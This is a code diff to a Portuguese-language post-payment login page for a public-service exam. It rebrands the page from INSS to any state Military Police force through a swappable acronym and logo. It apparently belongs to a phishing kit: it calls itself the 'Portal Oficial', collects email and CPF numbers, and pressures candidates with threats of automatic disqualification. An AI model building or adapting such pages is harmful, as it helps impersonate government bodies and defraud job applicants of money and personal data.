@@ -9,10 +9,14 @@ import { Card, CardContent } from '@/components/ui/card';
 import { CheckCircle, Shield, AlertTriangle, Loader2, X, Mail, ArrowRight } from 'lucide-react';
 import { useClarityEvents } from '@/hooks/use-clarity-events';
 import { useQuery } from '@tanstack/react-query';
-import inssLogo from '@assets/logo_INSS_1786320311202.png';
+import { useEstadoPM } from '@/hooks/useEstadoPM';
+import orgLogo from '@assets/logo-mj_1779836627251.png';
 
 export default function LoginPosPagamentoPage() {
   const [, setLocation] = useLocation();
+  const estadoPM = useEstadoPM();
+  const sigla = estadoPM?.sigla ?? 'PM';
+  const nomeCompleto = estadoPM?.nomeCompleto ?? 'Polícias Militares estaduais';
   const [email, setEmail] = useState('');
   const [cpfDigits, setCpfDigits] = useState('');
   const [isLoading, setIsLoading] = useState(false);
@@ -595,18 +599,18 @@ export default function LoginPosPagamentoPage() {
 
   return (
     <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
-      <ExercitoHeader />
+      <ExercitoHeader customTitle={sigla} />
 
       <main className="flex flex-col items-center px-4 py-10">
 
         {/* Logo + identificação */}
         <div className="w-full max-w-sm mb-6 text-center">
           <img
-            src={inssLogo}
-            alt="INSS"
+            src={orgLogo}
+            alt={sigla}
             className="h-9 w-auto object-contain mx-auto mb-3"
           />
-          <span className="text-xs text-gray-400 font-mono tracking-widest uppercase">Concurso Público INSS 2026</span>
+          <span className="text-xs text-gray-400 font-mono tracking-widest uppercase">Concurso {sigla} 2026</span>
         </div>
 
         {/* Título */}
@@ -842,7 +846,7 @@ export default function LoginPosPagamentoPage() {
           <div className="flex items-center justify-center gap-4 mt-5 text-xs text-gray-400">
             <span className="flex items-center gap-1">
               <Shield className="w-3 h-3" />
-              Portal Oficial INSS
+              Portal Oficial {sigla}
             </span>
             <span className="text-gray-300">·</span>
             <span>Protegido por LGPD</span>
@@ -867,12 +871,12 @@ export default function LoginPosPagamentoPage() {
               <div className="flex items-center justify-between px-6 py-4 border-b border-gray-100">
                 <div className="flex items-center space-x-3">
                   <img
-                    src={inssLogo}
-                    alt="INSS"
+                    src={orgLogo}
+                    alt={sigla}
                     className="h-8 w-auto object-contain"
                   />
                   <div>
-                    <p className="text-xs font-semibold text-gray-800 leading-tight">INSS</p>
+                    <p className="text-xs font-semibold text-gray-800 leading-tight">{sigla}</p>
                     <p className="text-xs text-gray-400 leading-tight">Concurso Público 2026</p>
                   </div>
                 </div>
@@ -908,10 +912,10 @@ export default function LoginPosPagamentoPage() {
                 {/* Corpo do texto */}
                 <div className="space-y-3 text-sm text-gray-700 leading-relaxed">
                   <p>
-                    A <strong>Perícia Médica Admissional</strong> é procedimento obrigatório previsto no edital do Concurso Público INSS 2026, e verifica as condições de saúde necessárias ao exercício das funções do cargo.
+                    A <strong>Perícia Médica Admissional</strong> é procedimento obrigatório previsto no edital do Concurso {sigla} 2026, e verifica as condições de saúde necessárias ao exercício das funções do cargo.
                   </p>
                   <p>
-                    A perícia atesta que o candidato atende aos requisitos de aptidão exigidos para posse no cargo, sendo etapa indispensável para prosseguimento no processo seletivo do INSS.
+                    A perícia atesta que o candidato atende aos requisitos de aptidão exigidos para posse no cargo, sendo etapa indispensável para prosseguimento no processo seletivo da {sigla}.
                   </p>
                 </div>
 
@@ -921,7 +925,7 @@ export default function LoginPosPagamentoPage() {
                 <div className="flex items-start space-x-2">
                   <AlertTriangle className="w-4 h-4 text-gray-500 flex-shrink-0 mt-0.5" />
                   <p className="text-xs text-gray-600 leading-relaxed">
-                    <span className="font-semibold text-gray-800">Atenção:</span> o não comparecimento implica desclassificação automática do Concurso Público INSS 2026.
+                    <span className="font-semibold text-gray-800">Atenção:</span> o não comparecimento implica desclassificação automática do Concurso {sigla} 2026.
                   </p>
                 </div>
 
@@ -938,7 +942,7 @@ export default function LoginPosPagamentoPage() {
                       className="mt-0.5 w-4 h-4 flex-shrink-0 accent-green-700"
                     />
                     <span className="text-xs text-gray-700 leading-relaxed">
-                      Declaro ter ciência de que a Perícia Médica Admissional é obrigatória e será realizada conforme as instruções do INSS — Concurso Público 2026.
+                      Declaro ter ciência de que a Perícia Médica Admissional é obrigatória e será realizada conforme as instruções da {sigla} — Concurso Público 2026.
                     </span>
                   </label>
 
@@ -959,7 +963,7 @@ export default function LoginPosPagamentoPage() {
               {/* Rodapé discreto */}
               <div className="px-6 py-3 border-t border-gray-100 bg-gray-50">
                 <p className="text-xs text-gray-400 text-center">
-                  Documento emitido automaticamente pelo portal oficial — INSS
+                  Documento emitido automaticamente pelo portal oficial — {sigla}
                 </p>
               </div>
 
